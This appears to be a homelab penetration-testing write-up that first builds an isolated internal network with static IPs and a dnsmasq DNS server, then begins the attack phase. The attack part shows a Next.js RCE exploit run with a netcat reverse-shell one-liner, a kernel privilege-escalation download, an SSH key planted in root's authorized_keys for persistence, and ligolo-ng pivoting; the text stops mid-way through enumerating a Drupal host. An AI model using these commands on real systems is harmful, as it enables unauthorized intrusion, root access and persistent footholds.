<img width="956" height="590" alt="image" src="https://github.com/user-attachments/assets/78249d90-5b62-40db-8df1-71f533e57086" />

Now that our Network Interface is created , we need to modify each of the VMs to use our Internal Network instead : 

#### Dirty2Geddon : 

Edit VM --> Network Adapter --> Custom --> Choose Internal . 

<img width="1501" height="851" alt="image" src="https://github.com/user-attachments/assets/6d4a752b-7f29-475e-ab50-c163bbf41b34" />

#### Backup :

Edit VM --> Network Adapter --> Custom --> Choose Internal . 

<img width="1429" height="551" alt="image" src="https://github.com/user-attachments/assets/b7391b62-1e38-4a1a-b56a-45a9805ebc79" />

#### Fail2Copy : 

For this one we will keep the first NIC and add a second one : 

Edit VM --> Add --> Network Adapter --> Custom --> Choose Internal . 

<img width="1561" height="837" alt="image" src="https://github.com/user-attachments/assets/362e7f40-540e-4b29-8bca-e363c44ac54b" />

Now we should have 2 NIC for this one : 

<img width="1531" height="798" alt="image" src="https://github.com/user-attachments/assets/b94c75bf-9523-43a0-a716-b9ea8f1abb78" />

#### ORNN / DC01 / CA01 / Rogue  : 

Same as Backup and Dirt2Geddon : 

Edit VM --> Network Adapter --> Custom --> Choose Internal . 

#### IP Addressing : 

Since we left DHCP disabled on our Internal network , none of these boxes will get an address on their own. That's on purpose , we assign every IP by hand so we know exactly what's talking to what , and we deliberately leave off a default gateway on each internal NIC , so even if something misbehaves , it has no route out.

Here's the addressing plan for 10.10.10.0/24 :

- Fail2Copy (internal NIC)	10.10.10.10	
- DirtyGeddon2	10.10.10.20	
- Backup	10.10.10.30	
- ORNN	10.10.10.40	 
- Rogue	10.10.10.50	
- DC01	10.10.10.100
- CA01  10.10.10.101

   
**Quick Notes :**

*DC01 isn't part of this addressing chain at all, it's a self-contained scenario that just happens to share the same wire. We'll set it up on its own at the end, pointing DNS at itself.And for CA01 since it is part of the Domain , the DNS will be the DC01*
*ORNN will serve as the DNS Server for all 5 machines except the DC since it needs to be its own DNS server*



##### ORNN : 

We're starting with ORNN since it's about to become the DNS server every other box depends on, it needs to be up and answering before the rest of the machines are told to point at it.

For ORNN's DNS role, the lightest option that fits is dnsmasq , way less overhead than standing up full BIND9 for something that just needs to answer a handful of internal lookups (and no internet access means there's nothing upstream to forward to anyway).

Since apt install needs internet access, we temporarily leave ORNN's adapter on NAT while we install packages, and switch it to Internal once we're done. In VM Settings → Network Adapter, this is the same dropdown from before, just flip it back to NAT for now.

<img width="1383" height="774" alt="image" src="https://github.com/user-attachments/assets/db417925-ef6a-4f0b-b7dc-0455a6e1e014" />

```bash
sudo apt update
sudo apt install dnsmasq -y

sudo nano /etc/dnsmasq.conf
```

Now inside of the file , for the Interface keep the same as the one you have once you do *ip a* :

```bash
# only listen on the internal interface, not the whole box
interface=ens32
bind-interfaces

# static hostnames for the lab boxes
address=/DirtyGeddon/10.10.10.20
address=/Fail2Copy/10.10.10.10
address=/backup/10.10.10.30
address=/ORNN/10.10.10.40
address=/Rogue/10.10.10.50

# no upstream forwarding — this network has no internet anyway
no-resolv
```

<img width="1243" height="856" alt="image" src="https://github.com/user-attachments/assets/2e1bca72-762e-4e3c-afa8-de5e9dc5e653" />

Now flip the adapter back : VM Settings → Network Adapter → Custom → Internal. (if it doesn't change just reboot the VM) :

<img width="1051" height="574" alt="image" src="https://github.com/user-attachments/assets/c3c72a53-0b89-4f82-aa28-d9276cc48713" />

With that done, ORNN's NIC loses its NAT-assigned DHCP address, so we assign the static one it's supposed to have (in this case it's ens32) :

```bash
sudo nano /etc/network/interfaces

auto ens32
iface ens32 inet static
    address 10.10.10.40
    netmask 255.255.255.0
```

No dns-nameservers line here, ORNN resolves for itself. We point its own resolver at itself :

```bash
sudo nano /etc/resolv.conf

nameserver 127.0.0.1
```

Restart both services to apply everything :

```bash
sudo systemctl restart networking
sudo systemctl restart dnsmasq
sudo systemctl enable dnsmasq
```
<img width="1315" height="874" alt="image" src="https://github.com/user-attachments/assets/137491c4-40ff-469d-9799-6a58cd8797f7" />

Quick check, ORNN should now resolve its own DNS records :

```bash
nslookup Fail2Copy 127.0.0.1
Or
dig Fail2Copy @127.0.0.1 
```

<img width="989" height="673" alt="image" src="https://github.com/user-attachments/assets/eb578c83-7478-4e05-b415-1622be1a2e79" />

Perfect our DNS is working , the Refused is probably from IPV6 request . that's why we checked again with dig and it worked perfectly .

Now let's move to the other boxes . 




##### Fail2Copy : 

First we need to identify which Interface is the NAT and which one is the Internal one : 

```bash
ip a
```

<img width="1152" height="558" alt="image" src="https://github.com/user-attachments/assets/a278e27b-9e7f-4eb8-a467-afbabd64910e" />

In this case the one that's already assigned is the NAT , and the one that is empty is the Internal network NIC (ens37 in this case) .

We only touch ens37 here, ens33 stays exactly as it is (DHCP, that's what keeps its internet access for the initial foothold) :

To assign the IP address manually , we need to modify the /etc/network/interfaces file to add the IP address , mask and DNS Server which is the same IP as the ORNN machine . 

```bash
su -
nano /etc/network/interfaces

auto ens37
iface ens37 inet static
    address 10.10.10.10
    netmask 255.255.255.0
    dns-nameservers 10.10.10.40
```

For the rest either comment it or delete it : 

<img width="958" height="544" alt="image" src="https://github.com/user-attachments/assets/5ff590c1-c6d5-4daa-bb4f-60ee28137a3f" />

Now we need to restart the Networking service : 

```bash
systemctl restart networking
```

<img width="1077" height="586" alt="image" src="https://github.com/user-attachments/assets/df63d2f4-7279-4056-80aa-d7ada2a520a9" />

We see that now we have an IP address assigned to our machine on the ens37 Interface . 

Now finally we just modify our resolv.conf file so that it uses the ORNN machine as its primary DNS , so that it can do name resolution for Internal machines : 

```bash
nano /etc/resolv.conf 

# Inside it :
nameserver 10.10.10.40
```

<img width="765" height="374" alt="image" src="https://github.com/user-attachments/assets/a1019826-ea3c-4342-a7c9-897acddb5a56" />

Now moving on to the second Box . 




##### Dirty2Geddon : 

For Ubuntu it uses netplan, check which config file actually exists before editing it :

```bash
ls /etc/netplan/
```

No *00-installer-config.yaml* here like you might expect, Ubuntu 24.04's installer generates 50-cloud-init.yaml instead, since it's cloud-init driving the network setup on first boot. That's the one we edit :

```bash
sudo nano /etc/netplan/50-cloud-init.yaml

network:
  version: 2
  ethernets:
    ens33:
      dhcp4: no
      addresses:
        - 10.10.10.20/24
      nameservers:
        addresses: [10.10.10.40]
```

Again, no routes line, no gateway, on purpose. Apply it , and for the DNS it's the ORNN's IP Address . 

Just comment what's already inside the file or delete it :

<img width="1189" height="665" alt="image" src="https://github.com/user-attachments/assets/589d39c3-d020-4fd7-8559-587a665f82f6" />

Again, no routes line, no gateway, on purpose. Apply it :

```bash
sudo netplan apply
```
<img width="1331" height="714" alt="image" src="https://github.com/user-attachments/assets/37f9a86e-03c0-400c-9c53-5995f874126d" />

We see that our IP address is now set for the ens33 interface . 

**Quick Note :**

Because this file is cloud-init managed, there's a chance cloud-init regenerates it back to DHCP on the next reboot. If your static IP mysteriously reverts after a restart, that's why, fix it permanently with :

```bash
sudo nano /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg

network: {config: disabled}
```

That tells cloud-init to leave netplan alone from here on.

<img width="1329" height="632" alt="image" src="https://github.com/user-attachments/assets/99c26713-1eb3-41b5-b53c-a491a0b10bd6" />

Now finally we just modify our resolv.conf file so that it uses the ORNN machine as its primary DNS , so that it can do name resolution for Internal machines : 

```bash
nano /etc/resolv.conf 

# Inside it :
nameserver 10.10.10.40
```

<img width="1284" height="622" alt="image" src="https://github.com/user-attachments/assets/e4b7fe80-caae-45b6-b6de-8858d3eb744e" />

Perfect , now moving on to the third Box . 



##### Backup : 

This is a Debian machine , so the file to modify is */etc/network/interfaces* :

First check what the name of the interface is : 

```bash
ip a
```

<img width="1114" height="575" alt="image" src="https://github.com/user-attachments/assets/95595a56-3928-478c-a303-bb0e18807204" />

In this case it is ens32 , now we modify our configuration file , again the DNS IP is going to be the ORNN machine's IP . 

```bash
su -
nano /etc/network/interfaces

auto ens32
iface ens32 inet static
    address 10.10.10.30
    netmask 255.255.255.0
    dns-nameservers 10.10.10.40
```

Then we restart the Networking Service : 

```bash
sudo systemctl restart networking
```

<img width="1137" height="437" alt="image" src="https://github.com/user-attachments/assets/258a3a2b-96a4-4c95-b188-ad7a667e321b" />

Our Ip is assigned without any issues . 

Now finally we just modify our resolv.conf file so that it uses the ORNN machine as its primary DNS , so that it can do name resolution for Internal machines : 

```bash
nano /etc/resolv.conf 

# Inside it :
nameserver 10.10.10.40
```

<img width="1020" height="582" alt="image" src="https://github.com/user-attachments/assets/a720a207-bf1b-4725-b8c4-83caf6906973" />




##### Rogue : 

Windows gets its static IP and DNS through the GUI, same dialog, one extra field this time :

- 1/ Control Panel → Network and Sharing Center → etho0

<img width="1315" height="711" alt="image" src="https://github.com/user-attachments/assets/b5eaa3ca-df48-407d-9b5a-4c620c7f0e81" />

- 2/ Properties --> IPV4 --> Properties :

- 3/ Choose Use the following IP address :

```text
IP address : 10.10.10.50
Subnet mask : 255.255.255.0
Default gateway : leave blank
Preferred DNS : 10.10.10.40
OK out of both dialogs.
```

<img width="1220" height="541" alt="image" src="https://github.com/user-attachments/assets/15933ba0-1a2b-425e-b002-cdcedec5b2af" />

Now just click Ok then close all the old tabs , open a cmd and check the new IP address : 

```cmd
ipconfig
```

<img width="1586" height="675" alt="image" src="https://github.com/user-attachments/assets/7da02bef-6421-4e9d-8acc-5de92e5d5e42" />

Perfect , we have our new IP address . 

I also changed the Hostname to match the one we specified in the DNS config , first open PS as administrator : 

```powershell
Rename-Computer -NewName Rogue
Restart-Computer 
```

<img width="1181" height="397" alt="image" src="https://github.com/user-attachments/assets/85151e71-5ce0-42ae-b816-662fe6c97152" />

Now our hostname should be Rogue once it restarts : 

<img width="1101" height="401" alt="image" src="https://github.com/user-attachments/assets/ee5ca024-8b7a-4026-8fd0-909ef252cfab" />

Perfect . 



##### DC01 : 


DC01 stays completely self-contained, no dependency on ORNN. It just needs to point at itself, 127.0.0.1 :

- 1/ Control Panel → Network and Sharing Center → etho0

<img width="1211" height="533" alt="image" src="https://github.com/user-attachments/assets/15e85a97-6db3-42ef-858f-4abd9495c93d" />

- 2/ Properties --> IPV4 --> Properties :

<img width="1277" height="816" alt="image" src="https://github.com/user-attachments/assets/5a6875d9-a25f-4955-b461-8a1fa467fd88" />

- 3/ Choose Use the following IP address :

```text
IP address : 10.10.10.100
Subnet mask : 255.255.255.0
Default gateway : leave blank
Preferred DNS : 127.0.0.1
OK out of both dialogs.
```

<img width="1397" height="673" alt="image" src="https://github.com/user-attachments/assets/102cd07d-6d66-4248-aa70-aa5f23f49ce9" />

Now just click Ok then close all the old tabs , open a cmd and check the new IP address : 

<img width="1374" height="644" alt="image" src="https://github.com/user-attachments/assets/90eaea2b-cbcd-46a3-925a-d1caf4283fc9" />

**Quick Note :** 

Pointing DC01's own DNS at 127.0.0.1 isn't just a formality here, it's actually required once you promote it to a Domain Controller later. AD needs to register its own SRV records into its own DNS zone, and a DC is expected to be authoritative for and resolve against itself. Since this box was never meant to depend on ORNN in the first place, that requirement lines up naturally with the design, nothing to reconcile.

Now everything is set . We can test the Connectivity . 


##### CA01 : 

For the CA01 , the DNS server will be the DC01 , But first let's give it a static IP address as well .

```powershell
# Remove any existing IP/route config first
Remove-NetIPAddress -InterfaceAlias "Ethernet0" -Confirm:$false
Remove-NetRoute -InterfaceAlias "Ethernet0" -Confirm:$false

# Set static internal IP
New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress 10.10.10.101 -PrefixLength 24

# Point DNS at DC01
Set-DnsClientServerAddress -InterfaceAlias "Ethernet0" -ServerAddresses 10.10.10.100
```

<img width="1087" height="552" alt="image" src="https://github.com/user-attachments/assets/0d99372b-6f11-4c3e-b5a9-0a8ec9d37a71" />

Now to verify : 

```powershell
ipconfig
Get-DnsClientServerAddress -InterfaceAlias "Ethernet0"
```

<img width="878" height="543" alt="image" src="https://github.com/user-attachments/assets/8f5b7d1e-71bc-4a88-bbf6-288a5c2923a3" />

The IP address is now static and the DNS is the DD01 . 

Now let's test the connectivity . 

#### Testing connectivity : 


##### Fail2Copy : 

First we will test the NAT : 

For this we need to be able to ping it from our Kali machine.

First get the IP address of the NAT NIC , it's the ens33 interface : 

<img width="1002" height="551" alt="image" src="https://github.com/user-attachments/assets/d2e389ca-8fba-440a-aa3b-77e532de09ed" />

Now from our Kali machine : 

<img width="1006" height="683" alt="image" src="https://github.com/user-attachments/assets/33540790-481f-4244-9a21-973873a9b3c1" />

Kali reaching the NAT-side IP confirms the public segment/entry point works, and it not reaching the internal IP confirms the isolation is holding, that's checks 1 and 2 from our plan in one go.

Now let's check if we can ping the other internal hosts .

For the Windows machine , we need to specify the IP address instead of the Hostname . But for the other Linux boxes it shouldn't be an issue . 

<img width="974" height="784" alt="image" src="https://github.com/user-attachments/assets/07d8222f-8a77-4091-a716-7732c8710538" />

We see that we are able to ping all the Linux boxes , Windows blocks ICMP by default , so as long as we are able to ping Copy2Fail from the windows Box we should be good :

<img width="906" height="517" alt="image" src="https://github.com/user-attachments/assets/e3393832-3699-4908-996f-d2d60c908ad6" />

We are able to ping our Linux box , which means the only reason why the ping didn't work is bcs ICMP was blocked . 

**Trouble Shooting DNS :**

If your internal name resolution is acting weird (pinging a hostname gives you back 127.0.0.1 or 127.0.1.1 instead of the actual internal IP) , check /etc/hosts before anything else , on both the box you're testing from AND on ORNN itself. 

If these machines were cloned from the same template , odds are /etc/hosts still has every box's name hanging off that 127.0.1.1 line from before the clones got renamed , and since Linux checks /etc/hosts before it ever asks DNS , that stale entry wins every time no matter how correctly dnsmasq is configured. 

Clean it up so each box only references itself , and while you're in ORNN's dnsmasq.conf , throw a no-hosts line in there too , dnsmasq reads its own local /etc/hosts by default and will happily serve you those same stale entries as "DNS answers" if you don't tell it not to.

In my case i cloned ORNN from Backup so i had this issue : 

<img width="1156" height="394" alt="image" src="https://github.com/user-attachments/assets/ab49c547-2dd8-4c1b-bc33-4854dc45529b" />

Notice how it says 127.0.1.1 ; change it to the normal localhost 127.0.0.1 then restart the DNS service : 

```bash
sudo nano /etc/hosts

127.0.0.1   localhost
127.0.1.1   ORNN
```

Then we restart the service : 

```bash
sudo systemctl restart dnsmasq
```

<img width="1006" height="602" alt="image" src="https://github.com/user-attachments/assets/50db3641-52cf-47b5-ac2e-84c77b90901c" />

Now if we test the Ping from the Fail2Copy box : 

<img width="954" height="692" alt="image" src="https://github.com/user-attachments/assets/9e392063-f4ac-46ce-a57a-ef16f56a2c47" />

We see that it works perfectly . 

If we even try to ping it from the Windows box using Hostname only , it will work : 

<img width="874" height="320" alt="image" src="https://github.com/user-attachments/assets/7a94ecca-b396-45ce-b653-5500bf1ef040" />

Let's move to the other boxes . 


##### Dirty2Geddon : 

Let's test pinging each of the internal machines using their hostname : 

To be able to resolve the Hostnames , we must modify the /etc/resolv.conf , to have the ORNN machine as our DNS resolver . 

<img width="1119" height="688" alt="image" src="https://github.com/user-attachments/assets/a00e4540-c725-438d-9ace-92a168c780a2" />

Now we can try pining them : 

<img width="1046" height="839" alt="image" src="https://github.com/user-attachments/assets/a0acd9ce-e668-4a65-baf0-2fd70a553645" />

The windows box shouldn't work , windows blocks icmp inbound by default but doesn't touch outbound , so let's try pinging it from the windows machine instead to see if it's actually reachable .

<img width="1130" height="608" alt="image" src="https://github.com/user-attachments/assets/e8a76cda-856a-48da-ac36-091b4ae34f4b" />

Worked Perfectly . 



##### Backup : 


Again let's test pinging each of the internal machines using their hostname : 

To be able to resolve the Hostnames , we must modify the /etc/resolv.conf , to have the ORNN machine as our DNS resolver . 

<img width="554" height="322" alt="image" src="https://github.com/user-attachments/assets/42faf8b4-e68e-4441-8c7e-b24a7820c702" />

We try pinging : 

<img width="887" height="730" alt="image" src="https://github.com/user-attachments/assets/4980c57d-adb1-4884-85b2-069f5bea2e9a" />

Again , the windows and DC01 shouldn't work since windows blocks icmp inbound by default , but if we test it from the Rogue machine instead it should go through fine , since outbound icmp isn't blocked .

<img width="1414" height="660" alt="image" src="https://github.com/user-attachments/assets/bdc60bc7-594a-433a-a1c5-5d56934ba812" />

Worked Perfectly . 



##### ORNN : 


Since ORNN is our DNS server , hostname resolution here is obviously not an issue , it's resolving against itself .

<img width="1005" height="831" alt="image" src="https://github.com/user-attachments/assets/1fe4d6e0-67b6-4722-829a-3819139de750" />

Pinging the other Linux boxes works for the same reason as before , they don't block icmp by default . Windows and the DC still won't respond though , same story , icmp is blocked inbound on both .

But we can test the ping from the windows machine instead . 

<img width="1390" height="630" alt="image" src="https://github.com/user-attachments/assets/33174b17-a912-4621-bb3c-4ec65e4d4270" />

No issues here as well . 



##### Rogue : 

Now from our Windows box , let's try pinging all the other machines : 

<img width="1064" height="922" alt="image" src="https://github.com/user-attachments/assets/3c2d970f-7deb-4f59-920a-6678d68bb4e1" />

Worked perfectly , for the DC , same as before ICMP will be blocked . 


##### DC01 :


Now from the DC let's check if we can resolve the other machines : 

<img width="964" height="879" alt="image" src="https://github.com/user-attachments/assets/3a4ac08c-f89e-48f1-94ec-6251faffa747" />

Again , Rogue shouldn't work since it's a Windows :)


##### CA01 :

For the CA01, what interests us the most is resolving the Domain name , and the connectivity with the DC01 , if it can do both , then it will definetly reach the other internal Hosts : 

To verify , first we check if we can resolve the Domain name using our DNS : 

```powershell
nslookup Isolate.local
```

Then we test the connectivity , we will need to test the ports directly , skipping the ICMP pings , since it will be blocked by default . 

```powershell
Test-NetConnection -ComputerName 10.10.10.100 -Port 445 -InformationLevel Detailed
Test-NetConnection -ComputerName 10.10.10.100 -Port 389
```

<img width="1131" height="673" alt="image" src="https://github.com/user-attachments/assets/bac0f7b8-03e7-4b3a-b4e8-a8f4c37dc36e" />

The DNS is working , and we can communicate with the DC01 in the Internal Network without any issues . We can finally move to the Attack phase .


## Attack Phase : 


### Fail2Copy (Initial Access) : 

Now checking our Kali machine : 

<img width="1172" height="640" alt="image" src="https://github.com/user-attachments/assets/975d9da1-73f2-44b1-8d16-985c3df99812" />

This is our NAT interface . We will first start by scanning the entire netowrk to try and find live hosts , we can use nmap to scan for live hosts only without enumerating all open ports .

```bash
nmap -sn 192.168.32.0/24
```

<img width="1190" height="626" alt="image" src="https://github.com/user-attachments/assets/c062d3ad-880f-4380-9472-a56f4f1e333d" />

To save us time , the IP address for the first box is the one highlighted : *192.168.32.147*

```bash
rustscan -a 192.168.32.147 --ulimit 5000 -b 1000  -- sVC
```

Since this is a Homelab , try lowering the batch number which is how many connections it tries to make at once, in this case i did 1000 , the default is 4500 , which is a lot of simultaneous connections, so it might miss some ports . 

The -- is to pipe the output of the open ports to nmap for Version Scanning . 

<img width="890" height="826" alt="image" src="https://github.com/user-attachments/assets/d62b4557-03e3-46a1-b2e5-8b34437d11fd" />

We see port 3000 open , we can enumerate it further . 

<img width="1212" height="697" alt="image" src="https://github.com/user-attachments/assets/acb84afb-8246-4c62-bbd8-03bc8e066f84" />

We can see that it is a NetxJS app . But we don't get a version yet , tried checking with whatweb but didn't get anything as well . 

```bash
whatweb http://192.168.32.147:3000
```

<img width="1485" height="209" alt="image" src="https://github.com/user-attachments/assets/09357e4e-d470-4b2b-8741-a26efdcaa261" />

Let's check the app , i already installed Wappalyzer Extension , which gives us information about the technologies used by the application . 

<img width="1899" height="866" alt="image" src="https://github.com/user-attachments/assets/f77bcdeb-dc50-4d48-bef7-0163cd30eb82" />

We get the version finally 15.0.4 . This one is vulnerable to an RCE , we can confirm by checking the Nextjs official website :

```bash
https://nextjs.org/blog/CVE-2025-66478
```

<img width="1301" height="753" alt="image" src="https://github.com/user-attachments/assets/78479857-2dbd-4abf-84d7-08e3bfbc7c59" />

We can use any of these exploits , i will be using this one since it gives us an interactive Shell .  

```bash
https://github.com/Jenderal92/CVE-2025-55182-React2shell
```

We just download the exploit , make it executable , and run it : 

```bash
wget https://raw.githubusercontent.com/p3ta00/react2shell-poc/refs/heads/master/react2shell-poc.py
chmod +x 
```

<img width="1182" height="799" alt="image" src="https://github.com/user-attachments/assets/9137fee4-1e21-4492-8ec0-7534a1b49207" />

It takes as a parameter the URL and command we want to run . 

The command we will run gives us back a reverse shell , we can use Revshell generator for this : 

```bash
https://www.revshells.com/
```

We can check if the machine has nc , since we can use it for our reverse shell .

<img width="1056" height="795" alt="image" src="https://github.com/user-attachments/assets/5198aaab-6b7d-426d-9385-1b135c7f545e" />

It is located at /usr/bin/nc .

Now back to resvshell generator : 

<img width="1141" height="724" alt="image" src="https://github.com/user-attachments/assets/83aa6d5a-ec14-4426-ad52-9affa0abf12d" />

Now we set up our listner on Port 7777 .

```bash
nc -lnvp 7777
python3 react2shell-poc.py -t 192.168.32.147:3000 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.32.134 7777 >/tmp/f'
```

<img width="1255" height="653" alt="image" src="https://github.com/user-attachments/assets/0527f63d-99ec-4c93-8bf5-e44375ab0551" />

First let's start by stabilizing our shell :

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
background 
stty raw -echo; fg
export TERM=xterm
PS1='\[\e[31m\]\u\[\e[96m\]@\[\e[35m\]\H\[\e[0m\]:\[\e[93m\]\w\[\e[0m\]\$'
```

<img width="1196" height="628" alt="image" src="https://github.com/user-attachments/assets/6aaa4840-232c-48bf-ad9b-6cb2c4e377a9" />

Now our shell is stabilized , we can start our privesc . 

What you can try is import tools like Chisel and look for misconfigurations , SUIDs , caps and permissions on files , but to save time , we will perform manual testing first and move to the kernel exploit . 

```bash
sudo -l : which prog can be ran with root perm . 
uname -sr / lsb_relase -a : Version + architecture .  
find / -type f -perm -04000 -ls 2>/dev/null : Find binaries with SUID .
```

<img width="860" height="278" alt="image" src="https://github.com/user-attachments/assets/f87cd152-4fc8-4d40-9987-c88de9a6092c" />

We can check online for Vulnerabilities for this kernel version .  The most recent one will be the Dirty Frag or Copy fail vulnerability . 

We'll test CopyFail first . 

```bash
https://xint.io/blog/copy-fail-linux-distributions#the-exploit-4
```

We just need to import the Exploit to the target host . we can use python for this , we setup python server , then use wget or curl to download the file onto the target . 

<img width="1255" height="867" alt="image" src="https://github.com/user-attachments/assets/25010551-d4f1-4aee-9fab-4a1b17ff4cbc" />

We already know Python is on the target host since we used it to stabilize our shell earlier . 

You can use the official exploit , i will be using this exploit since i find it to be more stable : 

```bash
https://github.com/slaptat/copyFail30/blob/main/copyFail30.py
```

We just import it the same way : 

```bash
wget https://raw.githubusercontent.com/slaptat/copyFail30/refs/heads/main/copyFail30.py
python3 -m http.server 80 
wget http://192.168.32.134/exploit.py
```
<img width="1491" height="663" alt="image" src="https://github.com/user-attachments/assets/692f42ae-e383-42ad-a6e2-b796a4a9463f" />

From there we just run it this should give us Root . 

<img width="1043" height="511" alt="image" src="https://github.com/user-attachments/assets/8bdae6f1-ff2b-4e16-9207-5439ff698b07" />

Now we will be using this Box to pivot to the Internal Network so we need to keep an easy way in . 

We can do that by getting the Root Private key , enable root login if not enabled so that we can login as root more reliabely . 

First we check the root .ssh directory : 

<img width="723" height="266" alt="image" src="https://github.com/user-attachments/assets/d184a9ed-7c6a-48f2-b125-1d5426128e7f" />

We see that we don't have any keys yet , if we check the SSH config : 

```bash
cat /etc/ssh/sshd_config
```

We see that it is set to default : 

<img width="660" height="344" alt="image" src="https://github.com/user-attachments/assets/765ffe73-d117-4df5-8c48-eb14f29fcaad" />

This means root can login but password is disabled , we need to generate a private key , then transfer it into the Target machine and save it in the /root/.ssh folder . 

```bash
# On our Kali box :

ssh-keygen -t ed25519 -f ~/.ssh/fail2copy_root -N ""
```

- ssh-keygen : generates a new SSH keypair (private + public key)
- t ed25519 : key type/algorithm, ed25519 instead of the older rsa, it's shorter, faster, and just as secure (modern default choice)
- f ~/.ssh/fail2copy_root : output file path for the private key, so you get fail2copy_root (private) and fail2copy_root.pub (public) in ~/.ssh/, named so you know exactly which box this key is for instead of overwriting your default id_ed25519
- N "" : sets the passphrase to empty, so it generates the key without prompting you to type a passphrase

<img width="1193" height="664" alt="image" src="https://github.com/user-attachments/assets/8f300ef1-ed25-41af-884d-fef71e158843" />

Here **fail2copy_root.pub** is the public key that we will transfer into the target machine , and the **fail2copy_root** , is the private key we will use to login . 

First on our Kali box , we set up our Python server on the same folder where we have our Keys .  

```bash
python3 -m http.server 80
```

<img width="1111" height="344" alt="image" src="https://github.com/user-attachments/assets/8e043502-b8db-45a0-b819-78345f15ef72" />

Now from the target box , we can download it using wget or curl .

<img width="1274" height="720" alt="image" src="https://github.com/user-attachments/assets/efc27c0d-a98a-470f-be61-539883c4cc61" />

Once downloaded , we need to rename it to `authorized_keys` , since that's the exact filename sshd looks for inside `/root/.ssh` , and lock down its permissions so it's not too open :

```bash
mv fail2copy_root.pub authorized_keys
chmod 600 authorized_keys
```

Now we can try to login using our Private key :

```bash
ssh -i fail2copy_root root@192.168.32.147
```

<img width="1413" height="872" alt="image" src="https://github.com/user-attachments/assets/18eebf50-96d0-4bc9-a14b-cae1744fbefb" />

Now that we made our access more persistent , we can move to the Pivoting section . 


### Pivoting/Tunneling : 


Now notice how our Kali machine is unable to reach any of the internal Hosts :

<img width="1792" height="704" alt="image" src="https://github.com/user-attachments/assets/bd8d318a-1760-4ed2-b724-7266e95b7a57" />

We can use a tool like ligolo or chisel , to give us full access to the Internal Network , by using our compromised Box as the pivot point , that all traffic gets routed through . i prefer ligolo since it's faster , it creates a new virtual NIC for us that routes traffic straight through the Pivot Box , no proxychains needed like you'd typically use with chisel for full subnet access , so it's cleaner and faster overall .

First we check if the machine has access to any new Networks : 

```bash
ip a
```

<img width="1333" height="638" alt="image" src="https://github.com/user-attachments/assets/7dcd97ae-3bdb-4df2-9b5e-b9218009f6e3" />

We find the 10.10.10.0/24 Network which is Our Internal netowrk . Importing Tools to this host to reach and exploit the other targets will be very noisy and it will demand a lot of dependencies for tools and all of that ,just not practical overall, so using this Box as our Pivot point is the best option here . For this we use Chisel : 

To use Chisel , we need to setup the ligolo server , then transfer the agent to the victim machine and run it on it to connect back to our Ligolo Server . 

This is the link to Install the agent : 

```bash
https://github.com/nicocha30/ligolo-ng/releases/tag/v0.9
```

You need to install the Linux one , then you can follow along .

First we need to create a new Network Interface then run Ligolo : 

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up  

# Launch ligolo server from kali with self signed certs : 
sudo ligolo-proxy -selfcert
```

<img width="1363" height="514" alt="image" src="https://github.com/user-attachments/assets/d9cc82cf-5a59-45f4-9a0d-6070cd12250e" />

Now that the NIC is created , it should show DOWN , this is normal since we haven't gotten a connection back yet . Launch Ligolo :

<img width="1568" height="654" alt="image" src="https://github.com/user-attachments/assets/e36440b7-62f5-4a32-aa6f-bdaf20a6b1e0" />

Then we need to import the Agent to the target machine , and make it executable . 

```bash
# On our Kali :
python3 -m http.server

# On target :
wget http://192.168.32.134/agent
chmod +x agent
```

<img width="1766" height="870" alt="image" src="https://github.com/user-attachments/assets/d48ca801-04d0-4b47-80cf-2b5badb55430" />

Now all we need to do is run the agent to connect back to us , Ligolo runs on port 11601 by default :
 
```bash
./agent -connect <Attack IP>:11601 -ignore-cert&

# & was added just to make it run a job in the background rather than blocking our terminal 
```

<img width="1197" height="412" alt="image" src="https://github.com/user-attachments/assets/9abe564d-a5b4-4329-8dd4-5a4e16cfe671" />

Now if we go back to our Ligolo server , we should see the connection . 

<img width="1550" height="719" alt="image" src="https://github.com/user-attachments/assets/23def129-fcfc-46c1-aef1-2ecdb7d5dfa1" />

Now we just specify the session we want to interact with : 

```bash
session
1
```

From there we can check the Network Interfaces that exist : 

```bash
# From inside the session :

ifconfig
```

<img width="1170" height="881" alt="image" src="https://github.com/user-attachments/assets/5d439521-6a12-4b8d-acf8-984d8f0e5fa1" />

We see the 10.10.10.0/24 Network , which is the Internal Network . Now to create the connection we just link the newly created NIC to this Internal Network Segment , then we start the connection from our Ligolo server . 

```bash
# From our terminal :

sudo ip route add 10.10.10.0/24 dev ligolo

# From Ligolo :
start 
```

<img width="1570" height="596" alt="image" src="https://github.com/user-attachments/assets/515be812-7a21-4caa-bf06-7bdbdc0c82fe" />

We see that it created the connection , and the NIC is now UP .

Now we can test pinging the Internal IP address for our Host directly from our Kali box : 

<img width="1334" height="682" alt="image" src="https://github.com/user-attachments/assets/92299611-5092-413f-a446-3f6889aceb98" />

Perfect we are able to reach the Internal Network . Moving on to exploiting the Intenal Hosts :

### Dirty2Geddon : 

First we scan the Entire Internal Network to get an idea of how many hosts exist on the Network . 

<img width="1186" height="847" alt="image" src="https://github.com/user-attachments/assets/b44cca71-4c98-4c3c-9b8a-288e9655e9f1" />

We are able to Identify all of the Internal Hosts : 

```bash
10.10.10.10 (Fail2Copy) 
10.10.10.20
10.10.10.30
10.10.10.40
10.10.10.50
```

We will start with the 10.10.10.20 which is the Dirty2Geddon Box :

First let's scan all ports , then use Version and default Scripts scans to see if we find any outdated service versions :

```bash
nmap -p- 10.10.10.20 -T5 
nmap -p80 10.10.10.20 -sVC 
```
<img width="1368" height="856" alt="image" src="https://github.com/user-attachments/assets/81b5aeae-ce2f-4e37-af83-58aff7745691" />

We are able to find the Drupal Version used which is Drupal 7 . 

Since this is using Drupal , we can use a tool like droopscan to enumerate the website further . 

```bash
https://github.com/SamJoan/droopescan
```

We can install it using pip , but first create your virtual env : 

```bash
python3 -m venv venv
source venv/bin/activate
pip install droopescan
```

<img width="1084" height="868" alt="image" src="https://github.com/user-attachments/assets/c239d0d0-ccf7-4667-87fc-7e48bfa31972" />

Looking at the doc , to run it : 

```bash
droopescan scan drupal -u http://example.org/ -t 32
```

Once you run the tool , it won't work , this is because many libraries that the tools uses were removed from Python 3.12 .  

<img width="1160" height="500" alt="image" src="https://github.com/user-attachments/assets/51446870-b582-4f92-809a-1029a5eb8019" />

If you are running an old version of python this can work for you , if not just use a recent tool , i will be using CMSeek since it is still maintainable . 

```bash
